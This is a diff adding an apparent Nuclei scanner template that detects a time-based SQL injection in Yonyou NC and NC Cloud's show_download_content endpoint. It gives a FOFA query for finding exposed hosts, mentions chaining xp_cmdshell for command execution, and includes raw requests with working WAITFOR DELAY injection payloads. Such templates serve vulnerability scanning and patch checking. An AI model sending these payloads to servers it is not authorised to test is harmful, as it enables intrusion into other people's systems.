@@ -1,0 +1,42 @@
+id: yongyouNC-Cloud-show_download_content-sql
+
+info:
+  name: 用友NC及NC Cloud show_download_content SQL延时注入漏洞
+  author: Superhero
+  severity: high
+  description: |-
+    fofa: app="用友-NC-Cloud"
+    用友NC及NC Cloud /ebvp/infopub/show_download_content接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487215&idx=1&sn=ee83124f6ab762537497ef55f1639001&chksm=c267bbdcf51032ca2b2ff4e1d56577be9caddfa3e7933eb570af312b56951ef18ade005bd62c&token=101124693&lang=zh_CN#rd
+  tags: sql injection
+
+
+
+http:
+  - raw:
+      - |
+        GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+
+
+      - |
+        GET /ebvp/infopub/show_download_content;.js?id=1';WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+ 
+
+
+
+
